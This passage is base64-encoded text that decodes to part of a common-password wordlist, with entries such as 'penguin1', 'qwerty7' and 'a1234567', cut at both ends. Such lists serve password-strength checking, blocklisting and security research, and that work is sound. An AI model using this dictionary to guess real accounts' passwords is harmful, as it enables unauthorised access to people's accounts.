Nrcw0Kc3RhbnRvbg0KcGVuZ3VpbjENCnBhdGhmaW5kDQp0ZXN0aWJpbA0KdGhldGhlDQpsaXN0ZW4NCmxpZ2h0bmluZw0KbGlnaHRpbmcNCmpldGVyMg0KbWFybWENCm1hcmsxDQptZXRvbw0KcmVwdWJsaWMNCnJvbGxpbg0KcmVkbGVnDQpyZWRib25lDQpyZWRza2luDQpyb2Njbw0KMTI0NQ0KYXJtYW5kDQphbnRob255Nw0KYWx0b2lkcw0KYW5kcmV3cw0KYmFybGV5DQphd2F5DQphc3N3aXBlDQpiYXVoYXVzDQpiYmJiYmIxDQpnb2hvbWUNCmhhcnJpZXINCmdvbGZwcm8NCmdvbGRlbmV5DQo4MTgxODENCjY2NjY2NjYNCjUwMDANCjVyeHlwbg0KY2FtZXJvbjENCmNhbGxpbmcNCmNoZWNrZXINCmNhbGlicmENCmZpZWxkcw0KZnJlZWZyZWUNCmZhaXRoMQ0KZmlzdA0KZmRtN2VkDQpmaW5hbGx5DQpnaXJhZmZlDQpnbGFzc2VzDQpnaWdnbGVzDQpmcmluZ2UNCmdhdGUNCmdlb3JnaWUNCnNjYW1wZXINCnJycGFzczENCnNjcmV3eW91DQpkdWZmeQ0KZGV2aWxsZQ0KZGltcGxlcw0KcGFjaW5vDQpvbnRhcmlvDQpwYXNzdGhpZQ0Kb2Jlcm9uDQpxdWVzdDENCnBvc3RvdjEwMDANCnB1cHB5ZG9nDQpwdWZmZXINCnJhaW5pbmcNCnByb3RlY3QNCnF3ZXJ0eTcNCnRyZXkNCnRyaWJlDQp1bHlzc2VzDQp0cmliYWwNCmFkYW0yNQ0KYTEyMzQ1NjcNCmNvbXB0b24NCmNvbGxpZQ0KY2xlb3BhdHINCmNvbnRyYWN0DQpkYXZpZGUNCm5vcnJpcw0KbmFtYXN0ZQ0KbXlydGxlDQpidWZmYWxvMQ0KYm9ub3ZveA0KYnVja2xleQ0KYnVra2FrZQ0KYnVybmluZw0KYnVybmVyDQpib3JkZWF1eA0KYnVybHkNCmh1bjk5OQ0KZW1pbGllDQplbG1vDQplbnRlcnMNCmVucmlxdWUNCmtlaXNoYQ0KbW9oYXdrDQp3aWxsYXJkDQp2Z2lybA0Kd2hhbGUNCnZpbmNlDQpqYXlkZW4NCmphcnJldHQNCjE4MTINCjE5NDMNCjIyMjMzMw0KYmlnamltDQpiaWdkDQp6b29tDQp3b3JkdXANCnppZ2d5MQ0KeWFob29vDQp3b3Jrb3V0DQp5b3VuZzENCndyaXR0ZW4NCnhtYXMNCnp6enp6ejENCnN1cmZlcjENCnN0cmlmZQ0Kc3VubGlnaHQNCnRhc2hhMQ0Kc2t1bmsNCnNoYXVuYQ0Kc2V0aA0Kc29mdA0Kc3ByaW50ZXINCnBlYWNoZXMxDQpwbGFuZXMNCnBpbmV0cmVlDQpwbHVtDQpwaW1waW5nDQp0aGVmb3JjZQ0KdGhlZG9uDQp0b29jb29sDQpsZWVhbm4NCmxhZGRpZQ0KbGlzdA0KbGtqaA0KbGFyYQ0Kam9rZQ0KanVwaXRlcjENCm1ja2VuemllDQptYXR0eQ0KcmVuZQ0KcmVkcm9zZQ0KMTIwMA0KMTAyOTM4DQphbm5tYXJpZQ0KYWxleGENCmFudGFyZXMNCmF1c3RpbjMxDQpncm91bmQNCmdvb3NlMQ0KNzM3MzczDQo3ODk0NTYxMg0KNzg5OTg3DQo2NDY0DQpjYWxpbWVybw0KY2FzdGVyDQpjYXNwZXIxDQpjZW1lbnQNCmNoZXZyb2xldA0KY2hlc3NpZQ0KY2FkZHkNCmNoaWxsDQpjaGlsZA0KY2FudWNrcw0KZmVlbGluZw0KZmF2b3JpdGUNCmZlbGxhdGlvDQpmMDB0YmFsbA0KZnJhbmNpbmUNCmdhdGV3YXkyDQpnaWdpDQpnYW1lY3ViZQ0KZ2lvdmFubmENCnJ1Z2J5MQ0Kc2NoZWlzc2UNCmRzaGFkZQ0KZHVkZXMNCmRpeGllMQ0Kb3dlbg0Kb2Zmc2hvcmUNCm9seW1waWENCmx1Y2FzMQ0KbWFjYXJvbmkNCm1hbmdhDQpwcmluZ2xlcw0KcHVmZg0KdHJpYmJsZQ0KdHJvdWJsZTENCnVzc3kNCmNvcmUNCmNsaW50DQpjb29saGFuZA0KY29sb25pYWwNCmNvbHQNCmRlYnJhDQpkYXJ0aHZhZA0KZGVhbGVyDQpjeWdudXN4MQ0KbmF0YWxpZTENCm5ld2Fyaw0KaHVzYmFuZA0KaGlraW5nDQplcnJvcnMNCmVpZ2h0ZWVuDQplbGNhbWlubw0KZW1tZXR0DQplbWlsaWENCmtvb2xhaWQNCmtuaWdodDENCm11cnBoeTENCnZvbGNhbm8NCmlkdW5ubw0KMjAwNQ0KMjIzMw0KYmxvY2sNCmJlbml0bw0KYmx1ZWJlcnINCmJpZ3Vucw0KeWFtYWhhcjENCnphcHBlcg0Kem9ycm8xDQowOTExDQozMDA2DQpzaXhzaXgNCnNob3BwZXINCnNpb2JoYW4NCnNleHRveQ0Kc3RhZmZvcmQNCnNub3dib2FyZA0Kc3BlZWR3YXkNCnNvdW5kcw0KcG9rZXkNCnBlYWJvZHkNCnBsYXlib3kyDQp0aXRpDQp0aGluaw0KdG9hc3QNCnRvb25hcm15DQpsaXN0ZXINCmxhbWJkYQ0Kam9lY29vbA0Kam9uYXMNCmpveWNlDQpqdW5pcGVyDQptZXJjZXINCm1heDEyMw0KbWFubnkNCm1hc3NpbW8NCm1hcmlwb3NhDQptZXQyMDAyDQpyZWdnYWUNCnJpY2t5MQ0KMTIzNg0KMTIyOA0KMTAxNg0KYWxsNG9uZQ0KYXJpYW5uYQ0KYmFiZXJ1dGgNCmFzZ2FyZA0KZ29uemFsZXMNCjQ4NDg0OA0KNTY4Mw0KNjY2OQ0KY2F0bmlwDQpjaGlxdWl0YQ0KY2hhcmlzbWENCmNhcHNsb2NrDQpjYXNobW9uZQ0KY2hhdA0KZmlndXJlDQpnYWxhbnQNCmZyZW5jaHkNCmdpem1vZG8xDQpnaXJsaWVzDQpnYWJieQ0KZ2FybmVyDQpzY3Jld3kNCmRvdWJsZWQNCmRpdmVycw0KZHRlNHV3DQpkb25lDQpkcmFnb25mbA0KbWFrZXINCmxvY2tzDQpyYWNoZWxsZQ0KdHJlYmxlDQp0d2lua2llDQp0cmFpbGVyDQp0cm9waWNhbA0KYWNpZA0KY3Jlc2NlbnQNCmNvb2tpbmcNCmNvY29jbw0KY29yeQ0KZGFib21iDQpkYWZmeQ0KZGFuZGZhDQpjeXJhbm8NCm5hdGhhbmllDQpicmlnZ3MNCmJvbmVycw0KaGVsaXVtDQpob3J0b24NCmhvZmZtYW4NCmhlbGxhcw0KZXNwcmVzc28NCmVtcGVyb3INCmtpbGxhDQpraWtpbW9yYQ0Kd2FuZGENCnc0ZzhhdA0KdmVyb25hDQppbGlrZWl0DQppZm9yZ2V0DQoxOTQ0DQoyMDAwMjAwMA0KYmlydGhkYXkxDQpiZWF0bGVzMQ0KYmx1ZTENCmJpZ2RpY2tzDQpiZWV0aG92ZQ0KYmxhY2tsYWINCmJsYXplcnMNCmJlbm55MQ0Kd29vZHdvcmsNCjAwNjkNCjAxMDENCnRhZmZ5DQpzdXNpZQ0Kc3Vydml2b3INCnN3aW0NCnN0b2tlcw0KNDU2Nw0Kc2hvZGFuDQpzcG9pbGVkDQpzdGVmZmVuDQpwaXNzZWQNCnBhdmxvdg0KcGlubmFjbGUNCnBsYWNlDQpwZXR1bmlhDQp0ZXJyZWxsDQp0aGlydHkNCnRvbmkNCnRpdG8NCnRlZW5pZQ0KbGVtb25hZGUNCmxpbHkNCmxpbGxpZQ0KbGFsYWtlcnMNCmxlYm93c2tpDQpsYWxhbGFsYQ0KbGFkeWJveQ0KamVlcGVyDQpqb3lqb3kNCm1lcmN1cnkxDQptYW50bGUNCm1hbm5uDQpyb2NrbnJvbA0Kcml2ZXJzaWQNCnJlZXZlcw0KMTIzYWFhDQoxMTExMjIyMg0KMTIxMzE0DQoxMDIxDQoxMDA0DQoxMTIwDQphbGxlbjENCmFtYmVycw0KYW1zdGVsDQphbWJyb3NlDQphbGljZTENCmFsbGV5Y2F0DQphbGxlZ3JvDQphbWJyb3NpYQ0KYWxsZXkNCmF1c3RyYWxpYQ0KaGF0cmVkDQpnc3BvdA0KZ3JhdmVzDQpnb29kc2V4DQpoYXR0cmljaw0KaGFycG9vbg0KODc4Nzg3DQo4aW5jaGVzDQo0d3d2dGUNCmNhc3NhbmRyDQpjaGFybGllMTIzDQpjYXNlDQpjaGF2ZXoNCmZpZ2h0aW5nDQpnYWJyaWVsYQ0KZ2F0c2J5DQpmdWRnZQ0KZ2VycnkNCmdlbmVyaWMNCmdhcmV0aA0KZnVja21lMg0Kc2FtbQ0Kc2FnZQ0Kc2VhZG9nDQpzYXRjaG1vDQpzY3hha3YNCnNhbnRhZmUNCmRpcHBlcg0KZGluZ2xlDQpkaXp6eQ0Kb3V0b3V0b3V0DQptYWRtYWQNCmxvbmRvbjENCnFiZzI2aQ0KcHVzc3kxMjMNCnJhbmRvbHBoDQp2YXVnaG4NCnR6cHZhdw0KdmFtcA0KY29tZWR5DQpjb21wDQpjb3dnaXJsDQpjb2xkcGxheQ0KZGF3Z3MNCmRlbGFuZXkNCm50NWQyNw0Kbm92aWZhcm0NCm5lZWRsZXMNCm5vdHJlZGFtDQpuZXduZXNzDQpteWtpZHMNCmJyeWFuMQ0KYm91bmNlcg0KaGloaWhpDQpob25leWJlZQ0KaWNlbWFuMQ0KaGVycmluZw0KaG9ybg0KaG9vaw0KaG90bGlwcw0KZHluYW1vDQprbGF1cw0Ka2l0dGllDQprYXBwYQ0Ka2FobHVhDQptdWZmeQ0KbWl6em91DQptb2hhbWVkDQptdXNpY2FsDQp3YW5uYWJlDQp3ZWRuZXNkYQ0Kd2hhdHVwDQp3ZWxsZXINCndhdGVyZmFsDQp3aWxseTENCmludmVzdA0KYmxhbmNoZQ0KYmVhcjENCmJpbGxhYm9uDQp5b3Vrbm93DQp6ZWxkYQ0KeXl5eXl5MQ0KemFjaGFyeTENCjAxMjM0NTY3DQowNzA0NjINCnp1cmljaA0Kc3VwZXJzdGFyDQpzdG9ybXMNCnRhaWwNCnN0aWxldHRvDQpzdHJhdA0KNDI3OTAwDQpzaWdtYWNoaQ0Kc2hlbHRlcg0Kc2hlbGxzDQpzZXh5MTIzDQpzbWlsZTENCnNvcGhpZTENCnN0ZWZhbm8NCnN0YXlvdXQNCnNvbWVyc2V0DQpzbWl0aGVycw0KcGxheW1hdGUNCnBpbmtmbG95ZA0KcGhpc2gxDQpwYXlkYXkNCnRoZWJlYXINCnRlbGVmb24NCmxhZXRpdGlhDQprc3diZHUNCmxhcnNvbg0KamV0dGENCmplcmt5DQptZWxpbmENCm1ldHJvDQpyZXZvbHV0aQ0KcmV0aXJlDQpyZXNwZWN0DQoxMjE2DQoxMjAxDQoxMjA0DQoxMjIyDQoxMTE1DQphcmNoYW5nZQ0KYmFycnkxDQpoYW5kYmFsbA0KNjc2NzY3DQpjaGFuZHJhDQpjaGV3YmFjYw0KZmxlc2gNCmZ1cmJhbGwNCmdvY3Vicw0KZnJ1aXQNCmZ1bGxiYWNrDQpnbWFuDQpnZW50bGUNCmR1bmJhcg0KZGV3YWx0DQpkb21pbmlxdQ0KZGl2ZXIxDQpkaGlwNmENCm9sZW1pc3MNCm9sbGllDQptYW5kcmFrZQ0KbWFuZ29zDQpwcmV0emVsDQpwdXNzc3kNCnRyaXBsZWgNCnZhbGRleg0KdmFnYWJvbmQNCmNsZWFuDQpjb21tZW50DQpjcmV3DQpjbG92aXMNCmRlYXRocw0KZGFuZGFuDQpjc2ZicjV5eQ0KZGVhZHNwaW4NCmRhcnJlbA0KbmluZ3VuYQ0Kbm9haA0KbmNjNzQ2NTYNCmJvb3RzaWUNCmJwMjAwMg0KYm91cmJvbg0KYnJlbm5hbg0KYnVtYmxlDQpib29rcw0KaG9zZQ0KaGV5eW91DQpob3VzdG9uMQ0KaGVtbG9jaw0KaGlwcG8NCmhvcm5ldHMNCmh1cnJpY2FuZQ0KaG9yc2VtYW4NCmhvZ2FuDQpleGNlc3MNCmV4dGVuc2ENCm11ZmZpbjENCnZpcmdpbmllDQp3ZXJkbmENCmlkb250a25vdw0KaW5mbw0KaXJvbg0KamFjazENCjFiaXRjaA0KMTUxbnhqbXQNCmJlbmRvdmVyDQpibXdibXcNCmJpbGxzDQp6YXExMjMNCnd4Y3Zibg0Kc3VycHJpc2UNCnN1cGVybm92DQp0YWhvZQ0KdGFsYm90DQpzaW1vbmENCnNoYWt1cg0Kc2V4eW9uZQ0Kc2V2aXlpDQpzb25qYQ0Kc21hcnQxDQpzcGVlZDENCnBlcGl0bw0KcGhhbnRvbTENCnBsYXlvZmZzDQp0ZXJyeTENCnRlcnJpZXINCmxhc2VyMQ0KbGl0ZQ0KbGFuY2lhDQpqb2huZ2FsdA0KamVuamVuDQpqb2xlbmUNCm1pZG9yaQ0KbWVzc2FnZQ0KbWFzZXJhdGkNCm1hdHRlbw0KbWVudGFsDQptaWFtaTENCnJpZmZyYWZmDQpyb25hbGQxDQpyZWFzb24NCnJoeXRobQ0KMTIxOA0KMTAyNg0KMTIzOTg3DQoxMDE1DQoxMTAzDQphcm1hZGENCmFyY2hpdGVjDQphdXN0cmlhDQpnb3RtaWxrDQpoYXdraW5zDQpncmF5DQpjYW1pbGENCmNhbXANCmNhbWJyaWRnDQpjaGFyZ2UNCmNhbWVybw0KZmxleA0KZm9yZXBsYXkNCmdldG9mZg0KZ2xhY2llcg0KZ2xvdGVzdA0KZnJvZ2dpZQ0KZ2VyYmlsDQpydWdnZXINCnNhbml0eTcyDQpzYWxlc21hbg0KZG9ubmExDQpkcmVhbWluZw0KZGV1dHNjaA0Kb3JjaGFyZA0Kb3lzdGVyDQpwYWxtdHJlZQ0Kb3BoZWxpYQ0KcGFqZXJvDQptNXdrcWYNCm1hZ2VudGENCmx1Y2t5b25lDQp0cmVlZnJvZw0KdmFudGFnZQ0KdXNtYXJpbmUNCnR5dnVncQ0KdXB0b3duDQphYmFjYWINCmFhYWFhYTENCmFkdmFuY2UNCmNodWNrMQ0KZGVsbWFyDQpkYXJrYW5nZQ0KY3ljbG9uZXMNCm5hdGUNCm5hdmFqbw0Kbm9wZQ0KYm9yZGVyDQpidWJiYTEyMw0KYnVpbGRpbmcNCmlhd2drMg0KaHJmemx6DQpkeWxhbjENCmVucmljbw0KZW5jb3JlDQplbWlsaW8NCmVjbGlwc2UxDQpraWxsaWFuDQprYXlsZWlnaA0KbXV0YW50DQptaXp1bm8NCm11c3RhbmcyDQp2aWRlbzENCnZpZXdlcg0Kd2VlZDQyMA0Kd2hhbGVzDQpqYWd1YXIxDQppbnNpZ2h0DQoxOTkwDQoxNTkxNTkNCjFsb3ZlDQpibGlzcw0KYmVhcnMxDQpiaWd0cnVjaw0KYmluZGVyDQpiaWdib3NzDQpibGl0eg0KeHFnYW5uDQp5ZWFoeWVhaA0KemVrZQ0KemFyZG96DQpzdGlja21hbg0KdGFibGUNCjM4MjUNCnNpZ25hbA0Kc2VudHJhDQpzaWRlDQpzaGl2YQ0Kc2tpcHBlcjENCnNpbmdhcG9yDQpzb3V0aHBhdw0Kc29ub3JhDQpzcXVpZA0Kc2xhbWR1bmsNCnNsaW1qaW0NCnBsYWNpZA0KcGhvdG9uDQpwbGFjZWJvDQpwZWFybDENCnRlc3QxMg0KdGhlcm9jazENCnRpZ2VyMTIzDQpsZWluYWQNCmxlZ21hbg0KamVlcGVycw0Kam9lYmxvdw0KbWNjYXJ0aHkNCm1pa2UyMw0KcmVkY2FyDQpyaGlub3MNCnJqdzd4NA0KMTEwMg0KMTM1NzY0NzkNCjExMjIxMQ0KYWxjb2hvbA0KZ3dqdTNnDQpncmV5d29sZg0KN2JnaXFrDQo3ODc4DQo1MzUzNTMNCjRzbno5Zw0KY2FuZHlhc3MNCmNjY2NjYzENCmNhcm9sYQ0KY2F0ZmlnaHQNCmNhbGkNCmZpc3Rlcg0KZm9zdGVycw0KZmlubGFuZA0KZnJhbmtpZTENCmdpenptbw0KZnVsbGVyDQpyb3lhbHR5DQpydWdyYXQNCnNhbmRpZQ0KcnVkb2xmDQpkb29sZXkNCmRpdmUNCmRvcmVlbg0KZG9kbw0KZHJvcA0Kb2VtZGxnDQpvdXQzeGYNCnBhZGR5DQpvcGVubm93DQpwdXBweTENCnFhendzeGVkYw0KcHJlZ25hbnQNCnF1aW5uDQpyYW1qZXQNCnVuZGVyDQp1bmNsZQ0KYWJyYXhhcw0KY29ybmVyDQpjcmVlZA0KY29jb2ENCmNyb3duDQpjb3dzDQpjbjQycWoNCmRhbmNlcjENCmRlYXRoNjY2DQpkYW1uZWQNCm51ZGl0eQ0KbmVnYXRpdmUNCm5pbWRhMmsNCmJ1aWNrDQpib2JiDQpicmF2ZXMxDQpicm9vaw0KaGVucmlrDQpoaWdoZXINCmhvb2xpZ2FuDQpkdXN0DQpldmVybGFzdA0Ka2FyYWNoaQ0KbW9ydGlzDQptdWxsaWdhbg0KbW9uaWVzDQptb3RvY3Jvcw0Kd2FsbHkxDQp3ZWFwb24NCndhdGVybWFuDQp2aWV3DQp3aWxsaWUxDQp2aWNraQ0KaW5zcGlyb24NCjF0ZXN0DQoyOTI5DQpiaWdibGFjaw0KeHl0ZnU3DQp5YWNrd2luDQp6YXExeHN3Mg0KeXk1cmJmc2MNCjEwMDEwMA0KMDY2MA0KdGFoaXRpDQp0YWtlaGFuYQ0KdGFsa3MNCjMzMjIxMQ0KMzUzNQ0Kc2Vkb25hDQpzZWF3b2xmDQpza3lkaXZlcg0Kc2hpbmUNCnNwbGVlbg0Kc2xhc2gNCnNwamZldA0Kc3BlY2lhbDENCnNwb29uZXINCnNsaW1zaGFkDQpzb3ByYW5vcw0Kc3BvY2sxDQpwZW5pczENCnBhdGNoZXMxDQp0ZXJyaQ0KdGhpZXJyeQ0KdGhldGhpbmcNCnRvb2hvdA0KbGFyZ2UNCmxpbXBvbmUNCmpvaG5uaWUNCm1hc2g0MDc3DQptYXRjaGJveA0KbWFzdGVycA0KbWF4ZG9nDQpyaWJiaXQNCnJlZWQNCnJpdGENCnJvY2tpbg0KcmVkaGF0DQpyaXNpbmcNCjExMTMNCjE0Nzg5NjMyDQoxMzMxDQphbGxkYXkNCmFsYWRpbg0KYW5kcmV5DQphbWV0aHlzdA0KYXJpZWwNCmFueXRpbWUNCmJhc2ViYWxsMQ0KYXRob21lDQpiYXNpbA0KZ29vZnkxDQpncmVlbm1hbg0KZ3VzdGF2bw0KZ29vZmJhbGwNCmhhOGZ5cA0KZ29vZGRheQ0KNzc4ODk5DQpjaGFyb24NCmNoYXBweQ0KY2FzdGlsbG8NCmNhcmFjYXMNCmNhcmRpZmYNCmNhcGl0YWxzDQpjYW5hZGExDQpjYWp1bg0KY2F0dGVyDQpmcmVkZHkxDQpmYXZvcml0ZTINCmZyYXppZXINCmZvcm1lDQpmb2xsb3cNCmZvcnNha2VuDQpmZWVsZ29vZA0KZ2F2aW4NCmdmeHF4Njg2DQpnYXJsaWMNCnNhcmdlDQpzYXNraWENCnNhbmpvc2UNCnJ1c3MNCnNhbHNhDQpkaWxiZXJ0MQ0KZHVrZWR1a2UNCmRvd25oaWxsDQpsb25naGFpcg0KbG9vcA0KbG9jdXR1cw0KbG9ja2Rvd24NCm1hbGFjaGkNCm1hbWFjaXRhDQpsb2xpcG9wDQpyYWlueWRheQ0KcHVtcGtpbjENCnB1bmtlcg0KcHJvc3BlY3QNCnJhbWJvMQ0KcmFpbmJvd3MNCnF1YWtlDQp0d2luDQp0cmluaXR5MQ0KdHJvb3BlcjENCmFpbWVlDQpjaXRhdGlvbg0KY29vbGNhdA0KY3JhcHB5DQpkZWZhdWx0DQpkZW50YWwNCmRlbmlybw0KZDl1bmdsDQpkYWRkeXMNCm5hcG9saQ0KbmF1dGljYQ0KbmVybWFsDQpidWtvd3NraQ0KYnJpY2sNCmJ1YmJsZXMxDQpib2dvdGENCmJvYXJkDQpicmFuY2gNCmJyZWF0aA0KYnVkcw0KaHVsaw0KaHVtcGhyZXkNCmhpdGFjaGkNCmV2YW5zDQplbmRlcg0KZXhwb3J0DQpraWtpa2kNCmtjY2hpZWZzDQprcmFtDQptb3J0aWNpYQ0KbW9udHJvc2UNCm1vbmdvDQp3YXF3M3ANCndpenphcmQNCnZpc2l0ZWQNCndoZGJ0cA0Kd2hrenljDQppbWFnZQ0KMTU0dWdlaXUNCjFmdWNrDQpiaW5reQ0KYmxpbmQNCmJpZ3JlZDENCmJsdWJiZXINCmJlbnoNCmJlY2t5MQ0KeWVhcjIwMDUNCndvbmRlcmZ1DQp3b29kZW4NCnhyYXRlZA0KMDAwMQ0KdGFtcGFiYXkNCnN1cnZleQ0KdGFtbXkxDQpzdHVmZmVyDQozbXB6NHINCjMwMDANCjNzb21lDQpzZWxpbmENCnNpZXJyYTENCnNoYW1wb28NCnNpbGsNCnNoeXNoeQ0Kc2xhcG51dHMNCnN0YW5kYnkNCnNwYXJ0YW4xDQpzcHJvY2tldA0Kc29tZXRpbWUNCnN0YW5sZXkxDQpwb2tlcjENCnBsdXMNCnRob3VnaHQNCnRoZXNoaXQNCnRvcnR1cmUNCnRoaW5raW5nDQpsYXZhbGFtcA0KbGlnaHQxDQpsYXNlcmpldA0KamVkaWtuaWcNCmpqampqMQ0Kam9jZWx5bg0KbWF6ZGE2MjYNCm1lbnRob2wNCm1heGltbw0KbWFyZ2F1eA0KbWVkaWMxDQpyZWxlYXNlDQpyaWNodGVyDQpyaGlubzENCnJvYWNoDQpyZW5hdGUNCnJlcGFpcg0KcmV2ZWFsDQoxMjA5DQoxMjM0MzIxDQphbWlnb3MNCmFwcmljb3QNCmFsZXhhbmRyYQ0KYXNkZmdoMQ0KaGFpcmJhbGwNCmhhdHRlcg0KZ3JhZHVhdGUNCmdyaW1hY2UNCjd4bTVycQ0KNjc4OQ0KY2FydG9vbnMNCmNhcGNvbQ0KY2hlZXN5DQpjYXNoZmxvdw0KY2Fycm90cw0KY2FtcGluZw0KZmFuYXRpYw0KZm9vbA0KZm9ybWF0DQpmbGVtaW5nDQpnaXJsaWUNCmdsb3Zlcg0KZ2lsbW9yZQ0KZ2FyZG5lcg0Kc2FmZXdheQ0KcnV0aGllDQpkb2dmYXJ0DQpkb25kb24NCmRpYXBlcnMNCm91dHNpZGVyDQpvZGluDQpvcGlhdGUNCmxvbGxvbA0KbG92ZTEyDQpsb29taXMNCm1hbGxyYXRzDQpwcmFndWUNCnByaW1ldGltZTIxDQpwdWdzbGV5DQpwcm9ncmFtDQpyMjlocXENCnRvdWNoDQp2YWxsZXl3YQ0KYWlybWFuDQphYmNkZWZnMQ0KZGFya29uZQ0KY3VtbWVyDQpkZW1wc2V5DQpkYW1uDQpuYWRpYQ0KbmF0ZWRvZ2cNCm5pbmViYWxsDQpuZGV5bDUNCm5hdGNoZXoNCm5ld29uZQ0Kbm9ybWFuZHkNCm5pY2V0aXRzDQpidWRkeTEyMw0KYnVkZHlzDQpob21lbHkNCmh1c2t5DQppY2VsYW5kDQpocjN5dG0NCmhpZ2hsaWZlDQpob2xsYQ0KZWFydGhsaW4NCmV4ZXRlcg0KZWF0bWVub3cNCmtpbWtpbQ0Ka2FyaW5lDQprMnRyaXgNCmtlcm5lbA0Ka2lya2xhbmQNCm1vbmV5MTIzDQptb29ubWFuDQptaWxlczENCm11ZmFzYQ0KbW91c2V5DQp3aWxtYQ0Kd2lsaGVsbQ0Kd2hpdGVzDQp3YXJoYW1tZQ0KaW5zdGluY3QNCmphY2thc3MxDQoyMjc3DQoyMHNwYW5rcw0KYmxvYmJ5DQpibGFpcg0KYmxpbmt5DQpiaWtlcnMNCmJsYWNramFjaw0KYmVjY2ENCmJsdWUyMw0KeG1hbg0Kd3l2ZXJuDQowODV0enpxaQ0Kenh6eHp4DQp6c21qMnYNCnN1ZWRlDQp0MjZnbjQNCnN1Z2Fycw0Kc3lsdmllDQp0YW50cmENCnN3b29zaA0Kc3dpc3MNCjQyMjYNCjQyNzENCjMyMTEyMw0KMzgzcGRqdmwNCnNob2UNCnNoYW5lMQ0Kc2hlbGJ5MQ0Kc3BhZGVzDQpzcGFpbg0Kc21vdGhlcg0Kc291cA0Kc3Bhcmhhd2sNCnBpc3Nlcg0KcGhvdG8xDQpwZWJibGUNCnBob25lcw0KcGVhdmV5DQpwaWNuaWMNCnBhdmVtZW50DQp0ZXJyYQ0KdGhpc3RsZQ0KdG9reW8NCnRoZXJhcHkNCmxpdmVzDQpsaW5kZW4NCmtyb25vcw0KbGlsYml0DQpsaW51eA0Kam9obnN0b24NCm1hdGVyaWFsDQptZWxhbmllMQ0KbWFyYmxlcw0KcmVkbGlnaHQNCnJlbm8NCnJlY2FsbA0KMTIwOA0KMTEzOA0KMTAwOA0KYWxjaGVteQ0KYW9sc3Vja3MNCmFsZXhhbGV4DQphdHRpY3VzDQphdWRpdHQNCmJhbGxldA0KYjkyOWV6emgNCmdvb2R5ZWFyDQpoYW5uYQ0KZ3JpZmZpdGgNCmd1YmJlcg0KODYzYWJnc2cNCjc0NzQNCjc5Nzk3OQ0KNDY0NjQ2DQo1NDMyMTANCjR6cWF1Zg0KNDk0OQ0KY2g1bm1rDQpjYXJsaXRvDQpjaGV3ZXkNCmNhcmViZWFyDQpjYWxlYg0KY2hlY2ttYXQNCmNoZWRkYXINCmNoYWNoaQ0KZmV2ZXINCmZvcmdldGl0DQpmaW5lDQpmb3JsaWZlDQpnaWFudHMxDQpnYXRlcw0KZ2V0aXQNCmdhbWJsZQ0KZ2VyaGFyZA0KZ2FsaWxlbw0KZzN1andnDQpnYW5qYQ0KcnVmdXMxDQpydXNobW9yZQ0Kc2NvdXRzDQpkaXNjdXMNCmR1ZGVtYW4NCm9seW1wdXMNCm9zY2Fycw0Kb3NwcmV5DQptYWRjb3cNCmxvY3VzdA0KbG95b2xhDQptYW1tb3RoDQpwcm90b24NCnJhYmJpdDENCnF1ZXN0aW9uDQpwdGZlM3h4cA0KcHd4ZDV4DQpwdXJwbGUxDQpwdW5rYXNzDQpwcm9waGVjeQ0KdXl4bnlkDQp0eXNvbjENCmFpcmNyYWZ0DQphY2Nlc3M5OQ0KYWJjYWJjDQpjb2NrdGFpbA0KY29sdHMNCmNpdmlsd2FyDQpjbGV2ZWxhbmQNCmNsYXVkaWExDQpjb250b3VyDQpjbGVtZW50DQpkZGRkZGQxDQpjeXBoZXINCmRlbmllZA0KZGFwenU0NTUNCmRhZ21hcg0KZGFpc3lkb2cNCm5hbWUNCm5vbGVzDQpidXR0ZXJzDQpidWZvcmQNCmhvb2NoaWUNCmhvdGVsDQpob3Nlcg0KZWRkeQ0KZWxsaXMNCmVsZGlhYmxvDQpraW5ncmljaA0KbXVkdmF5bmUNCm1vdG93bg0KbXA4bzZkDQp3aWZlDQp2aXBlcmd0cw0KaXRhbGlhbm8NCmlubm9jZW50DQoyMDU1DQoyMjExDQpiZWF2ZXJzDQpibG9rZQ0KYmxhZGUxDQp5YW1hdG8NCnpvb3JvcGENCnlxbGdyNjY3DQowNTA1MDUNCnp4Y3Zibm0xDQp6dzZzeWoNCnN1Y2tjb2NrDQp0YW5nbzENCnN3aW5nDQpzdGVybg0Kc3RlcGhlbnMNCnN3YW1weQ0Kc3VzYW5uYQ0KdGFtbWllDQo0NDU1NjYNCjMzMzY2Ng0KMzgwemxpa2kNCnNleHBvdA0Kc2V4eWxhZHkNCnNpeHR5bmluDQpzaWNrYm95DQpzcGlmZnkNCnNsZWVwaW5nDQpza3lsYXJrDQpzcGFya2xlcw0Kc2xhbQ0KcGludGFpbA0KcGhyZWFrDQpwbGFjZXMNCnRlbGxlcg0KdGltdGltDQp0aXJlcw0KdGhpZ2hzDQpsZWZ0DQpsYXRleA0KbGxhbWFzDQpsZXRzZG9pdA0KbGtqaGcNCmxhbmRtYXJrDQpsZXR0ZXJzDQpsaXp6YXJkDQptYXJsaW5zDQptYXJhdWRlcg0KbWV0YWwxDQptYW51DQpyZWdpc3Rlcg0KcmlnaHRvbg0KMTEyNw0KYWxhaW4NCmFsY2F0DQphbWlnbw0KYmFzZWJhbDENCmF6ZXJ0eXVpDQphdHRyYWN0DQphenJhZWwNCmhhbXBlcg0KZ290ZW5rcw0KZ29sZmd0aQ0KZ3V0dGVyDQpoYXdrd2luZA0KaDJzbGNhDQpoYXJtYW4NCmdyYWNlMQ0KNmNoaWQ4DQo3ODk2NTQNCmNhbmluZQ0KY2FzaW8NCmNhenpvDQpjaGFtYmVyDQpjYnI5MDANCmNhYnJpbw0KY2FseXBzbw0KY2FwZXRvd24NCmZlbGluZQ0KZmxhdGhlYWQNCmZpc2hlcm1hDQpmbGlwbW9kZQ0KZnVuZ3VzDQpnb2FsDQpnOXpuczQNCmZ1bGwNCmdpZ2dsZQ0KZ2FicmllbDENCmZ1Y2sxMjMNCnNhZmZyb24NCmRvZ21lYXQNCmRyZWFtY2FzDQpkaXJ0eWRvZw0KZHVubG9wDQpkb3VjaGUNCmRyZXNkZW4NCmRpY2tkaWNrDQpkZXN0aW55MQ0KcGFwcHkNCm9ha3RyZWUNCmx5ZGlhDQpsdWZ0NA0KcHV0YQ0KcHJheWVyDQpyYW1hZGENCnRydW1wZXQxDQp2Y3JhZHENCnR1bGlwDQp0cmFjeTcxDQp0eWNvb24NCmFhYWFhYWExDQpjb25xdWVzdA0KY2xpY2sNCmNoaXRvd24NCmNvcnBzDQpjcmVlcGVycw0KY29uc3RhbnQNCmNvdXBsZXMNCmNvZGUNCmNvcm5ob2xlDQpkYW5tYW4NCmRhZGENCmRlbnNpdHkNCmQ5ZWJrNw0KY3VtbWlucw0KZGFydGgNCmN1dGUNCm5hc2gNCm5